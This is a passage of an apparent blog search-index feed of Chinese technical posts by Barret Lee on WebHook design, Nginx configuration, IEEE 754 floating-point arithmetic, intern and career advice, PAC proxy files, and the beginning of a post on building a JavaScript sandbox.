五项原则中有一条是单一职责原则，意思就是一个类只应该有一个影响它变化的因素，小喜刚开始的设计就违背了这个原则。倘若再给 SDK 加上几个变量，多次继承的方式还吃得消么？ 相关阅读 《桥接模式》 《Design Patterns - Bridge Pattern》]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
        <tag>桥接模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何设计友好的 WebHook]]></title>
    <url>%2Fblog%2F2016%2F12%2F26%2F2016-12-26-how-to-design-webhook%2F</url>
    <content type="text"><![CDATA[在一些工具流的设计中，经常遇到一个体验非常不好的情况： 每次都需要采用长轮询或者隔一段时间再尝试的方式获取结果。其原因可能有两个： 调用方（Client）没有一个稳定的在线服务，Server 无法主动联系 Client Server 并没有考虑主动 Push 消息 WebHook 存在的前提也需要满足以上两点，基本交互流程如下图： WebHook 的设计1、接口设计 WebHook 需要具备良好的自解性，也就是调用 Client 接口时，将自己完整的信息传达到客户端： 1234567891011121314151617// POST&#123; "source": &#123; "platform": "A Niubility Platform", "other": "other infomation" &#125;, "target": &#123; "name": "Barret Lee", "version": "1.0.0", "other": "other infomation" &#125;, "data": &#123; //... &#125;, "needCallback": true, "serverTime": "2016-12-26 11:55:45"&#125; 在接口中需要详细说明，数据源从哪里来（source），数据需要穿给谁（target），传递那些数据（data），是否需要对方发送回执（needCallback），以及其他信息。 这样做的目的是为了避免发送出现错误，比如发错了对象；即便出错也方便通过日志记录排查问题。 2、多 Hook 设计 URI 备注 操作 http://example.com/receiveHook 通知小李修 bug 删除 / 编辑 http://example2.com/receiveHook 通知小王修 bug 删除 / 编辑 WebHook 的设计一定要支持多 Hook，你永远都不知道下一个系统对接需求会在什么时候到来。 对于复杂的 Hook 设计，表格中可能还有：是否需要回执、是否停用、安全 Token、数据配置等项。 3、安全性设计 这里的安全性是为 Client 考虑的，Client 可能对 refer 或者 origin 做了限制，但这远远不够。当用户在 Server 端注册 WebHook 时，就应该开始考虑 Hook 的安全性了： 12// POSTresponse.setHeader("x-webhook-sign", SHA1(webhook)); Client 在接收到 WebHook 时需要验证 x-webhook-sign 字段，如果不正确应该向服务器响应的错误码（或许此时服务器收到错误码后应该停用这个 Hook）。 4、retry 机制 极有可能因为 Client 的不稳定，导致 Hook 调用失败，此时可以考虑多次尝试： 12345request(&#123; url: webhookURL, retryTimes: 2, // ...&#125;); 小结对于阻塞链路的 WebHook，比如对页面进行性能检测，只有检测通过后页面才可以发布，Client 端可能也需要提供类似的 WebHook 回执。 随着应用的复杂度提升，系统解耦变得越来越重要，WebHook 作为一种通用的交互方案，在设计上多留一个心眼，十分有意义！]]></content>
      <categories>
        <category>工具</category>
        <category>网络交互</category>
      </categories>
      <tags>
        <tag>WebHook</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx 配置简述]]></title>
    <url>%2Fblog%2F2016%2F11%2F19%2F2016-11-19-nginx-configuration-start%2F</url>
    <content type="text"><![CDATA[不论是本地开发，还是远程到 Server 开发，还是给提供 demo 给人看效果，我们时常需要对 Nginx 做配置，Nginx 的配置项相当多，如果考虑性能配置起来会比较麻烦。不过，我们往往只是需要一个静态 Server，或者一个反向代理 Server，这对 Nginx 来说小菜一碟。 本文将给大家介绍 Nginx 配置的基本知识，不想细看的同学可以直接跳到最后一个例子。 简介Nginx 的安装就不解释了，方便起见，建议在各平台可以直接执行对应安装命令： 123456# CentOSyum install nginx;# Ubuntusudo apt-get install nginx;# Macbrew install nginx; 一般可以在 /etc/nginx/nginx.conf 中配置，启动参数为： 12345678# 启动nginx -s start;# 重新启动，热启动，修改配置重启不影响线上nginx -s reload;# 关闭nginx -s stop;# 修改配置后，可以通过下面的命令测试是否有语法错误nginx -t; -s，signal，意思就是向 nginx 发送 start|reload|stop 命令，还是很好理解的。先看一个最简单的 nginx.conf 配置： 1234567891011events &#123; # 需要保留这一个段落，可以为空&#125;http &#123; server &#123; listen 127.0.0.1:8888; location / &#123; root /home/barret/test/; &#125; &#125;&#125; 启动后，访问 htttp://127.0.0.1:8888 ，如果 /home/barret/test/ 下有 index.html 文件就会展示 index.html 的内容，否则返回 404。 Nginx 配置一个 Web 服务器以下对配置 Web 服务器的参数做简单说明，包括如何配置端口、域名，如何处理请求，如何响应请求。 1、 虚拟主机和请求的分发 域名和端口的配置12345678listen 127.0.0.1:8000;listen *:8000;listen localhost:8000;# IPV6listen [::]:8000;# other paramslisten 443 default_serer ssl;listen 127.0.0.1 default_server accept_filter=dataready backlog=1024 主机名配置123server_name www.barretlee.com barretlee.comserver_name *.barretlee.comserver_name ~^\.barret\.com$ URI 匹配12345678910111213location = / &#123; # 完全匹配 = # 大小写敏感 ~ # 忽略大小写 ~*&#125;location ^~ /images/ &#123; # 前半部分匹配 ^~ # 可以使用正则，如： # location ~* \.(gif|jpg|png)$ &#123; &#125;&#125;location / &#123; # 如果以上都未匹配，会进入这里&#125; 2、 文件路径的定义 根目录设置123location / &#123; root /home/barret/test/;&#125; 别名设置12345678location /blog &#123; alias /home/barret/www/blog/;&#125;location ~ ^/blog/(\d+)/([\w-]+)$ &#123; # /blog/20141202/article-name # -&gt; /blog/20141202-article-name.md alias /home/barret/www/blog/$1-$2.md;&#125; 首页设置1index /html/index.html /php/index.php; 重定向页面设置1234567891011error_page 404 /404.html;error_page 502 503 /50x.html;error_page 404 =200 /1x1.gif;location / &#123; error_page 404 @fallback;&#125;location @fallback &#123; # 将请求反向代理到上游服务器处理 proxy_pass http://localhost:9000;&#125; try_files 设置123456789try_files $uri $uri.html $uri/index.html @other;location @other &#123; # 尝试寻找匹配 uri 的文件，失败了就会转到上游处理 proxy_pass http://localhost:9000;&#125;location / &#123; # 尝试寻找匹配 uri 的文件，没找到直接返回 502 try_files $uri $uri.html =502;&#125; Nginx 配置反向代理服务器反向代理（reserve proxy）方式是指用代理服务器来接受 Internet 上的连接请求，然后将请求转发给内部网络中的上游服务器，并将上游服务器上得到的结果返回给 Internet 上请求连接的客户端，此时代理服务器对外的表现就是一个 Web 服务器。 Nginx 具备超强的高并发高负载能力，一般会作为前端的服务器直接向客户端提供静态文件服务；而业务一般还包含一些业务逻辑需要 Apache、Tomcat 等服务器来处理，故通常 Nginx 对外表现即为静态 Web 服务器也是反向代理服务器。 缺点是增加了一次请求的处理时间，优点是降低了上游服务器的负载，尽量将压力放在 Nginx 服务器上。 1、负载均衡配置 upstream，定义一个上游服务器集群12345678910upstream backend &#123; # ip_hash; server s1.barretlee.com; server s2.barretlee.com;&#125;server &#123; location / &#123; proxy_pass http://backend; &#125;&#125; 2、反向代理 proxy_pass 将请求转发到有处理能力的端上，默认不会转发请求中的 Host 头部12345678910111213141516171819location /blog &#123; prox_pass http://localhost:9000; ### 下面都是次要关注项 proxy_set_header Host $host; proxy_method POST; # 指定不转发的头部字段 proxy_hide_header Cache-Control; proxy_hide_header Other-Header; # 指定转发的头部字段 proxy_pass_header Server-IP; proxy_pass_header Server-Name; # 是否转发包体 proxy_pass_request_body on | off; # 是否转发头部 proxy_pass_request_headers on | off; # 显形/隐形 URI，上游发生重定向时，Nginx 是否同步更改 uri proxy_redirect on | off;&#125; 一个简单的例子，Node.js一个十分常见的需求：处理请求，如果是静态文件，Nginx 直接返回，否则交给 Node 服务器处理。首先创建了一个 Node 服务器： 1234const http = require('http');http.createServer((req, res) =&gt; &#123; res.end('hello world');&#125;).listen(9000); 任何请求过来都返回 hello world，简版的 Nginx 配置如下， 12345678910111213141516171819202122events &#123; # 这里可不写东西 use epoll;&#125;http &#123; server &#123; listen 127.0.0.1:8888; # 如果请求路径跟文件路径按照如下方式匹配找到了，直接返回 try_files $uri $uri/index.html; location ~* ^/(js|css|image|font)/$ &#123; # 静态资源都在 static 文件夹下 root /home/barret/www/static/; &#125; location /app &#123; # Node.js 在 9000 开了一个监听端口 proxy_pass http://127.0.0.1:9000; &#125; # 上面处理出错或者未找到的，返回对应状态码文件 error_page 404 /404.html; error_page 502 503 504 /50x.html; &#125;&#125; 首先 try_files，尝试直接匹配文件；没找到就匹配静态资源；还没找到就交给 Node 处理；否则就返回 4xx/5xx 的状态码。 小结本文内容为阅读《深入理解 Nginx 模块开发和架构解析》时做的一点笔记，以前配置 Nginx 服务器总是得上网找答案，现在把这些项都理解并记到脑子里了，还是担心忘记，博客稍作记录。 十分建议读者边阅读边动手尝试，利用 nginx -t 测试语法，遇到问题就 Google 搜索下，上手会很快。后续有空会详细介绍 Nginx 运维知识。]]></content>
      <categories>
        <category>网络交互</category>
        <category>网络技术</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[谈一谈我在阿里的成长]]></title>
    <url>%2Fblog%2F2016%2F10%2F21%2F2016-10-21-my-growth-at-alibaba%2F</url>
    <content type="text"><![CDATA[前几天受阿里通信的同事邀请，分享了一个关于成长的话题。其实我不太热衷于分享此类话题，作为一个技术人，分享那些没有技术干货的内容总感觉有些怪怪的。但最后还是拟下了这个话题 ——《谈一谈我在阿里的成长》，所以本文主要是对分享的 PPT 做简述。 可以回首一下，毕业工作后的这段时间里，你做过哪些事情让自己感觉有了很大的成长？ 我简单枚举了一下，主要是这几个方面： 涉足一个未知的领域，走进去，那就是成长；能够坚持不懈的完成一件事情，优化一个项目，那也是成长；能够沉淀方案，推广自己的想法，让更多的人收益，那也是成长；能够带领多个人去完成一个项目，那更是很不错的成长。 成长总是伴随着痛苦，因为你需要解决一个以前从未解决过的问题。你可以参考别人的处理方法，也可以自己摸索，但不管怎样，都需要硬着头破走过去，破茧成蝶，那才能成长。 工作之后，能够支配的时间越来越少了，尤其是在互联网行业，或许你每天就是在加班加点中度过，每每回到家，就只想苟延残喘一下，好好躺着，闭上眼睛迎接苦逼的第二天，就不用说什么利用闲暇时间搞搞研究，提升下自己了。 所以会时常把成长这件事情放在公司，希望在工作中提升自己。下面我来聊一聊，我是如何在工作中提升自己的，当然，只是抛砖引玉，更希望阁下能够在文章下方分享更多成长的「秘诀」。 业务中的成长这一块可以分为两个部分：技术能力 + 业务能力。 技术能力又可以分为编程能力、架构能力和工程能力，我们不讨论那么复杂，一言以蔽之，就是解决问题的能力。我就以之前做过的淘宝首页为例吧， 接手淘宝首页之后，我分析了业务中存在的问题，针对罗列出来的问题，逐个击破： 平台问题：不断地用 issue 来轰炸平台的维护者，暴露问题，推动解决问题 开发环境：通过优化流程和开发工具，提升效率 沟通问题：指定规则，减少沟通成本，添加运营辅助工具，帮助他们解决问题 依赖系统：分清强弱依赖关系，强依赖转化为弱依赖，弱依赖转化为无依赖，添加多重监控和错误布点，及时警报发现问题 高风险：找多人 review 整体架构，做好风险预案，做好上线前自动化检测等 当我们梳理完这些问题，并一个一个地处理好之后，成长自然就体现出来了。这个时间还是颇为漫长的，用了一年半的时间，从刚开始的唯唯诺诺、畏首畏尾，变得游刃有余、处变不惊。 以上更多的是使用技术手段来解决问题，而业务能力的提升，需要我们走进业务： 首先，必须明确产品和运营的目标是什么，最直接的方式就是询问他们近一个阶段的 KPI，了解产品面向的用户群体，迭代上线的节奏，每期迭代的具体目标，包括整个产品的思路，以及运营方式等等。 了解整个产品的全貌后，你才能走进业务，站在业务方的角度掷地有声的「砍需求」。数据是业务的死穴，你看清了产品，掌握了产品的数据，就能够清楚体会到，这个产品经理是在正儿八经搞项目，还是为了糊弄他的老板，随便画上几页 PRD 打发时间。 当然，参与到业务的沟通也是一件很有意思的事情，你可以跟着运营学运营技能，也可以跟着产品学习产品技能，真正走进业务，也会有很多的成长。 除此之外，你还可以主动担任项目经理，把握风险、提高协同，帮助产品如期上线。这里面需要很多的沟通和思考，十分锻炼人。 业务之外的成长如果你身处四五十甚至更多人的大团队，那么恭喜你，一定要好好珍惜整个大团队的带来的技术氛围。 因为在团队中，除了做业务的同时外，一定还有不少搞性能优化、做流程、做架构、做中间件等等的同事，你做的东西可能跟他们没有太多的交集，但千万不能错过与这些人交流的机会。下班之后，如果发现一两个同学没走，赶紧凑过去，跟他沟通下业务，交流下技术，坎一坎人生，聊一聊理想。这么聊着聊着，半年时间，你就收获： 一群可以扯淡的同事，闲暇时间不会寂寞 了解整个团队的全貌，而且还会看到团队的一些问题，甚至会冒出一些想法 掌握很多很多的技术细节，你可能很少有场景去踩这些坑，但是同事可以传授给你 当然，如果你想拿到成绩，还是需要回归到业务，反哺团队。 如果你有想法，并且准备 Owner 起一件事情，你可以这么做： 不断抛出问题，然后不断抛出这些问题的解决方案，并落实 拉人进来提问题，让他们帮忙解决这些问题 汇总所有的问题，规划时间和目标，形成小组并定期汇报 沉淀方案，推广方案，让更多人受益并持续跟进 实际上，第一步开始，你就已经开始 owner 这件事情了。 小结本文从业务内外两个角度，回顾了一下我在阿里待了两年多的一些成长和感受，希望能够引发你的思考，更希望你可以在文章下方留言，分享你的成长；）]]></content>
      <categories>
        <category>观点和感想</category>
        <category>笔记本</category>
      </categories>
      <tags>
        <tag>成长</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[揭秘 0.1 + 0.2 != 0.3]]></title>
    <url>%2Fblog%2F2016%2F09%2F28%2F2016-09-28-ieee754-operation-in-js%2F</url>
    <content type="text"><![CDATA[“0.1 + 0.2 = ?”，这道题如果给小学生，他会立马告诉你答案是 0.3，但是交给一些程序去计算，结果就不是那么简单了。 事实上，不仅仅是 JS，在其他采用 IEEE754 浮点数标准的语言中，0.1 + 0.2 都不会等于 0.3，但是 0.2 + 0.3 却等于 0.5，这是为何？想必这类问题也困扰着不少程序员。 IEEE754 浮点数的演算我们知道，科学计数法中 30000 可以写成 3x104，以 10 为底数 4 为指数的科学计数法。在 IEEE754 标准中是比较类似的，只不过它是二进制数，底数也为 2。 IEEE 754 中最常用的浮点数值表示法是：单精确度（32位）和双精确度（64位），JavaScript 采用的是后者。举个例子，十进制数 150，使用双精度浮点数表示法，表示如下： 12// D 表示十进制，B 表示二进制150D = 2^8 * 0.1001011B // 后面省略了 46 个 0 可以通过短除法计算： 12345678910111213141516171819202122232425 150 余数位÷ 2--------------- 75 0 ÷ 2--------------- 37 1÷ 2--------------- 18 1÷ 2--------------- 9 0÷ 2--------------- 4 1÷ 2--------------- 2 0÷ 2--------------- 1 0÷ 2--------------- 0 1 最后一个余数为高位值，于是拿到 150 对应的二进制数位 1001011，也就等于 2^8 * 0.1001011。 上面是整数的表示法，而小数的表示法采用的是乘二取整，如 0.1，它的二进制表示为： 12// (0011) 表示循环0.1D = 2^-3 * 0.110011(0011) 其演算方法如下： 1234567891011121314151617181920 0.1 整数位× 2--------------- 0.2 0 × 2--------------- 0.4 0 * ↓× 2--------------- 0.8 0 × 2--------------- 1.6 1 × 2--------------- 1.2 1× 2--------------- 0.4 0 * ↑ (0011循环) 与整数不同的是，第一个计算得到的整数位为最高位，故 0.1 对应的二进制数为 0.000110011(0011)，也就等于 2^-3 0.1100110011(0011)。 如果一个数既包含整数部分，又包含小数部分，其表示法的计算，需要分拆为整数和小数两部分，然后相加得到结果。 IEEE754 浮点数精度丢失IEEE754 浮点数表示法的数据格式如下图： 123456// 下图采用大端表示，高位在左，低位在右。sign exponent fraction+---+----------+---------------------+| 1 | 2~12 | 13~64 |+---+----------+---------------------+ 符号位：高位第 1 位，如图 sign 部分 指数位：高位第 2~12 位，如图 exponent 部分 尾数位：剩下的 fraction 部分 从上面小数的乘二取整演算中可以看到，有些小数对应的二进制数是无法写全的，比如 0.1，而 fraction 尾数部分有要求，只允许 52 位，超过部分进一舍零。 那么，我们就可以得到： 12340.1D = 2^-4 * 1.10011(0011)B= 2^-4 * 1.10011(0011 repeat 12 times)0011B // ← 最后一位为 1，进 1= 2^-4 * 1.10011(0011 repeat 12 times)010B 揭秘 0.1 + 0.2根据上面我们了解到的知识，我们可以很容易算出这些值： 1230.1D = 2^-4 * 1.1001100110011001100110011001100110011001100110011010B0.2D = 2^-3 * 1.1001100110011001100110011001100110011001100110011010B0.3D = 2^-2 * 1.0011001100110011001100110011001100110011001100110011B 0.1 + 0.2 时，先将两者指数统一为 -3，故 0.1 小数点向左移一位，于是： 1234 0.1100110011001100110011001100110011001100110011001101B+ 1.1001100110011001100110011001100110011001100110011010B------------------------------------------------------------= 10.0110011001100110011001100110011001100110011001100111B 得到的二进制数为： 110.0110011001100110011001100110011001100110011001100111B 小数点往左移一位使得整数部分为 1，此时尾数部分为 53 位，进一舍零，于是得到最后的值是： 12^-2 * 1.0011001100110011001100110011001100110011001100110100 这个值转化成真值，结果为：0.30000000000000004。那么 0.1 + 0.2 = 0.30000000000000004 的推演到这里就结束了。 相关验证毕竟咱们手动计算可能存在笔误，可以通过一个叫做 double-bits 的 npm 进行推演，我写了一个小 demo，感兴趣的可以玩耍下： 12345678910111213141516const db = require('double-bits');const pad = require('pad');// [lo, hi] where lo is a 32 bit integer and hi is a 20 bit integer.const base2Str = (n) =&gt; &#123; const f = db.fraction(n); const s = db.sign(n) ? '-' : ''; const e = `2^$&#123;db.exponent(n) + 1&#125;`; const t = `0.$&#123;pad(f[1].toString(2), 20, '0')&#125;$&#123;pad(f[0].toString(2), 32, '0')&#125;`; return `$&#123;s&#125;$&#123;e&#125; * $&#123;t&#125;`;&#125;;console.log(base2Str(0.1).toString(2));console.log(base2Str(0.2).toString(2));console.log(base2Str(0.3).toString(2));console.log(base2Str(1.2).toString(2)); 上面输出结果为： 12342^-3 * 0.110011001100110011001100110011001100110011001100110102^-2 * 0.110011001100110011001100110011001100110011001100110102^-1 * 0.100110011001100110011110011001100110011001100110011002^1 * 0.10011001100110011001111001100110011001100110011001100 最后为了按照计算机的思维，IEEE754 的标准来计算 0.1 + 0.2，又重新复习了一遍大学计算机基础的知识，原码、反码、补码，以及除二取余、乘二取整计算法，最后能够推演出来，也算是一个胜利吧~ 更多阅读 IEEE 754 Converter 维基百科 IEEE 754 题图：math by Roman Mager 笔耕不辍，欢迎关注微信公众号小胡子哥（barretlee_com），分享生活，分享技术，我在那里等你。]]></content>
      <categories>
        <category>前端杂烩</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>IEEE754</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何做好一名实习生]]></title>
    <url>%2Fblog%2F2016%2F09%2F27%2F2016-09-27-how-to-be-a-excellent-intern%2F</url>
    <content type="text"><![CDATA[最近看到有几个同事准备着转正，想借此机会聊一下实习生相关的话题——如何成为一名优秀的实习生。 公司为什么需要实习生如果你认为公司招聘实习生，就是为了攫取优质的廉价劳动力，随意安排些杂七杂八的琐碎事，那可就大错特错了。 公司人才入口一般有两个渠道，社招和校招。社招成本向来都很高，得花大价钱好不容易抓来一个资深人士，搞不好还是一根「老油条」；而学生不太一样，没有经过太多外界文化的洗礼，大部分成天在大学里泡着电脑，打字速度和编程能力都是相当的可以，这类同学稍加培育，摇身一变就能成为专业人士。 要知道，熟悉公司的环境是需要一段时间的。在这段时间里，公司对待实习生和社招人员的要求和态度不太一样，前者可以潜心钻研技术并且融入公司环境，而后者除了需要融入环境，还要承担业务的压力，两者对比效果可想而知。在实习过程中，公司可以通过观察实习生的品质、能力和其他综合能力，从而决定实习生的去留，整个抉择还是比较果断的；但是对社招人员，劝退一个人的成本很高。 需要注意的是，将实习生当临时工/兼职工的公司也是存在的，同学们需要擦亮双眼，好好甄别。 如何做好一名实习生当你踏进公司的那一刻，说明你已经具备了某些留在这家公司的潜质。实习的这段时间，你的任务就是挖掘自己、提升能力、适应环境，甚至可以尝试去改变所处的环境。下面我列举几点，我对「如何做好一名实习生」的看法： 1、说出来，表达出来 如同你当年进入大学一样，高考拿到了十分优异的成绩，而在大学里的佼佼者面前依然显得颇为渺小；进入职场也是一样的，你身边的同事在这个行业身经百战，已然成为老兵，所以你在他们面前也会显得比较稚嫩。 如果遇到不懂的问题或者不爽的事情，在老兵面前，不需要隐忍不言，更不能不懂装懂。有什么就说什么，有不懂就问，实习期犯下的错误是你踏入这家公司后成本最低的，这种机会不要浪费。 2、承认自己的错误 一定要明确，你是实习生，普通的犯错公司都是完全可以容忍的；错了就是错了，就坦诚地承认，不要说「没人告诉我，我也不知道」云云，这种话说出来没有任何意义，除了增加了同事对你的不信任感。愿意承认自己的错误，别人才愿意指出你的问题，学会以人为鉴。 3、注意细节 每一个细节都是往后转正的加分项。比如 Word 文档排版整洁，离开工位闭合电脑，做好会议记录，思考旁边同事嘀咕的问题等等，都是很小很小的事情，但是粗糙的人永远都做不好这些事情。在他们眼里，这些都不是事儿，细节问题都不是问题。 4、先缝上你的嘴巴，再张开 刚毕业那会儿，性格上或多或少有点尖锐，现实总是与你想象中的场景有些差异，不要因为这些差异就妄自评论。把想说的话先咽下去，经过大脑过滤后再表达出来，表达的内容要凝练、简洁、有说服力、有表现力。 尤其是对外的时候，更要注意，因为公司内、外有一堵隐形的墙，有些事情只能在围墙内讨论。 5、看清整个团队的全貌 一个大的团队下面有很多小组，每个小组做的事情不尽相同，要看清这个团队的全貌，你需要做三件事情：沟通、沟通和沟通！找每个小组的成员和 Leader 交流，团队成员一般很少会拒绝回答实习生的问题，不要担心他们太忙，再忙也有空回答你的几个问题。当然，还有一种沟通，单向输入的，那便是读文档、读代码，摸清楚每个系统的基本结构，运行的大致流程，然后动手实践一番，这个过程中你会学到很多。 以上几点建议，不是很全面，但都是经验之谈。端正态度，提升能力，融入到团队，多交流、多沟通，同时有思考、有沉淀，并且让同事看到你的想法，如果能够引发他们对你评价或与你讨论那就再好不过了；） （完） 题图 by Jesse Gardner 有一个月没写东西了，不是因为太忙，而是有点懒笔了=。 = 忙永远只是一个借口，它只能说明，没有把「重要不紧急」的事情处理好，一旦到了某个极限点，手里上就都变成「重要并且紧急」 的事情了。 笔耕不辍，欢迎关注微信公众号小胡子哥（barretlee_com），分享生活，分享技术，我在那里等你。]]></content>
      <categories>
        <category>观点和感想</category>
      </categories>
      <tags>
        <tag>实习生</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[详解代理自动配置 PAC]]></title>
    <url>%2Fblog%2F2016%2F08%2F25%2F2016-08-25-pac-file%2F</url>
    <content type="text"><![CDATA[最近一直在做跨域中华局域网的工作，了解了很多代理知识和基础概念，很零散，也很细碎。希望通过一段时间的学习，能够自由地穿梭在国际互联网和中华局域网之间。后续会写一系列文章记录我了解到的知识点，本文要说的是我们平时接触比较多的 PAC，全名为 proxy auto-config。 什么是 PACPAC，一个自动代理配置脚本，包含了很多使用 JavaScript 编写的规则，它能够决定网络流量走默认通道还是代理服务器通道，控制的流量类型包括：HTTP、HTTPS 和 FTP。 它是一段 JavaScript 脚本： 123function FindProxyForURL(url, host) &#123; return "DIRECT";&#125; 上面就是一个最简洁的 PAC 文件，意思是所有流量都直接进入互联网，不走代理。 PAC 语法和函数上面函数中，url 字段就是我们在浏览器地址栏输入的待访问地址，host 为该地址对应的 hostname，return 语句有三种指令： DIRECT，表示无代理直接连接 PROXY host:port，表示走 host:port 的 proxy 服务 SOCKS host:port，表示走 host:port 的 socks 服务 而返回的接口可以是多个代理串联： 1return "PROXY 222.20.74.89:8800; SOCKS 222.20.74.89:8899; DIRECT"; 上面代理的意思是，默认走 222.20.74.89:8800 的 proxy 服务；如果代理挂了或者超时，则走 222.20.74.89:8899 的 socks 代理；如果 socks 也挂了，则无代理直接连接。从这里可以看出 PAC 的一大优势：自动容灾。 PAC 提供了几个内置的函数，下面一一介绍下： dnsDomainIs 类似于 ==，但是对大小写不敏感， 1234if (dnsDomainIs(host, "google.com") || dnsDomainIs(host, "www.google.com")) &#123; return "DIRECT";&#125; shExpMatch Shell 正则匹配，* 匹配用的比较多，可以是 *.example.com，也是可以下面这样， 1234if (shExpMatch(host, "vpn.domain.com") || shExpMatch(url, "http://abcdomain.com/folder/*")) &#123; return "DIRECT"; &#125; isInNet 判断是否在网段内容，比如 10.1.0.0 这个网段，10.1.1.0 就在网段中， 123if (isInNet(dnsResolve(host), "172.16.0.0", "255.240.0.0")) &#123; return "DIRECT";&#125; myIpAddress 返回主机的 IP， 123if (isInNet(myIpAddress(), "10.10.1.0", "255.255.255.0")) &#123; return "PROXY 10.10.5.1:8080";&#125; dnsResolve 通过 DNS 查询主机 ip， 123456if (isInNet(dnsResolve(host), "10.0.0.0", "255.0.0.0") || isInNet(dnsResolve(host), "172.16.0.0", "255.240.0.0") || isInNet(dnsResolve(host), "192.168.0.0", "255.255.0.0") || isInNet(dnsResolve(host), "127.0.0.0", "255.255.255.0")) &#123; return "DIRECT";&#125; isPlainHostName 判断是否为诸如 http://barret/，http://server-name/ 这样的主机名， 123if (isPlainHostName(host)) &#123; return "DIRECT";&#125; isResolvable 判断主机是否可访问， 123if (isResolvable(host)) &#123; return "PROXY proxy1.example.com:8080";&#125; dnsDomainLevels 返回是几级域名，比如 dnsDomainLevels(barretlee.com) 返回的结果就是 1， 12345if (dnsDomainLevels(host) &gt; 0) &#123; return "PROXY proxy1.example.com:8080";&#125; else &#123; return "DIRECT";&#125; weekdayRange 周一到周五， 12345if (weekdayRange("MON", "FRI")) &#123; return "PROXY proxy1.example.com:8080";&#125; else &#123; return "DIRECT";&#125; dateRange 一月到五月， 12345if (dateRange("JAN", "MAR")) &#123; return "PROXY proxy1.example.com:8080"; &#125; else &#123; return "DIRECT";&#125; timeRange 八点到十八点， 12345if (timeRange(8, 18)) &#123; return "PROXY proxy1.example.com:8080";&#125; else &#123; return "DIRECT"; &#125; alert 据说这个函数可以用来调试，不过我在 Chrome 上测试并未生效， 12resolved_host = dnsResolve(host);alert(resolved_host); PAC 文件的安装和注意事项在 Windows 系统中，通过「Internet选项 -&gt; 连接 -&gt; 局域网设置 -&gt; 使用自动配置脚本」可以找到配置处，下放的地址栏填写 PAC 文件的 URI，这个 URI 可以是本地资源路径(file:///)，也可以是网络资源路径(http://)。 Chrome 中可以在「chrome://settings/ -&gt; 显示高级设置 -&gt; 更改代理服务器设置」中找到 PAC 填写地址。 需要注意的几点： PAC 文件被访问时，返回的文件类型（Content-Type）应该为：application/x-ns-proxy-autoconfig，当然，如果你不写，一般浏览器也能够自动辨别 FindProxyByUrl(url, host) 中的 host 在上述函数对比时无需转换成小写，对大小写不敏感 没必要对 dnsResolve(host) 的结果做缓存，DNS 在解析的时候会将结果缓存到系统中 更多阅读 代理自动配置 - wikipedia Web Proxy Autodiscovery Protocol Navigator Proxy Auto-Config File Format WPAD 的原理及实现 findproxyforurl]]></content>
      <categories>
        <category>网络交互</category>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>proxy</tag>
        <tag>翻墙</tag>
        <tag>pac</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[构建一个安全的 JavaScript 沙箱]]></title>
    <url>%2Fblog%2F2016%2F08%2F23%2F2016-08-23-javascript-sandbox%2F</url>
    <content type="text"><![CDATA[在 Node.js 中有一个模块叫做 VM，它提供了几个 API，允许代码在 V8 虚拟机上下文中运行，如： 12345const vm = require('vm');const sandbox = &#123; a: 1, b: 2 &#125;;const script = new vm.Script('a + b');const context = new vm.createContext(sandbox);script.runInContext(context); vm.Script 中的代码是预编译好的，通过 vm.createContext 将代码加载到一个上下文环境中，置入沙箱（sandbox），然后通过 script.runInContext 执行代码，整个操作都在封闭的 VM 中进行。这是 Node.js 提供给我们的便捷功能，那么，在浏览器环境中呢？是否也能做到将代码运行在沙箱中？本文带着大家来探索一番。 代码编译工具邪恶的 eval eval 函数可以将一个 Javascript 字符串视作代码片段执行，不过它存在诸多问题，如调试困难、性能问题等，并且它在运行时可以访问闭包环境和全局作用域，存在代码注入的安全风险，作为沙箱，这也是我们不期望看到的。eval 虽然好用，但是经常被滥用，在这里我们不多讨论它。 new Function Function 构造函数会创建一个新的函数对象，它可以作为 eval 的替代品: 1fn = new Function(...args, 'functionBody'); 返回的 fn 是一个定义好的函数，最后一个参数为函数体。它和 eval 不太一样： fn 是一段编译好的代码，可以直接执行，而 eval 需要编译一次 fn 没有对所在闭包的作用域访问权限，不过它依然能够访问全局作用域 如何阻止它访问全局作用域呢？ with 关键词with 是阻止程序访问上一级作用域的一道防火墙： 1234function compileCode(code) &#123; code = 'with (sandbox) &#123;' + code + '&#125;'; return new Function('sandbox', code);&#125; 如上代码，code 被执行时，首先会寻找 sandbox 中的变量，如果不存在，会往上追溯 global 对象，虽然有一道防火墙，但是依然不能阻止 fn 访问全局作用域。 似乎在 ECMAScript 5 中掌握的知识已经不足以解决 code 逃逸沙箱的问题了，此时我们可以把焦点放在 ES6 提供的新特性上。 ES6 ProxyES6 中提供了一个 Proxy 函数，它是访问对象前的一个拦截器，下面举一个简单的栗子： 12345678910const p = new Proxy(&#123;&#125;, &#123; get(target, key) &#123; if(key === 'a') &#123; return 1; &#125; Reflect.get(target, key); &#125;&#125;);p.a // 1p.s // undefined 代码中，Proxy 给 {} 设置了属性访问拦截器，倘若访问的属性为 a 则返回 1，否则走正常程序。 这里我们可以使用 proxy 对访问做拦截处理，sandbox 本不存在的属性会追溯到全局变量上访问，此时我们可以欺骗程序，告诉它这个「不存在的属性」是存在的，于是有了下面的代码： 123456789101112function compileCode(code) &#123; code = 'with (sandbox) &#123;' + code + '&#125;'; const fn = new Function('sandbox', code); return (sandbox) =&gt; &#123; const proxy = new Proxy(sandbox, &#123; has(target, key) &#123; return true; // 欺骗，告知属性存在 &#125; &#125;); return fn(proxy); &#125;&#125; 似乎这么做就可以了，但既然用到了 ES6 的特性，我们便不能忽略 ES6 中一个可以控制 with 关键词行为的变量。 Symbol.unscopablesSymbol 是 JS 的第七种数据类型，它能够产生一个唯一的值，同时也具备一些内建属性，这些属性可以用来进行元编程（meta programming），即对语言本身编程，影响语言行为。其中一个内建属性 Symbol.unscopables，通过它可以影响 with 的行为。 123456789101112const foo = () =&gt; 'global';class A &#123; foo() &#123; return 'clourse'; &#125; get [Symbol.unscopables]() 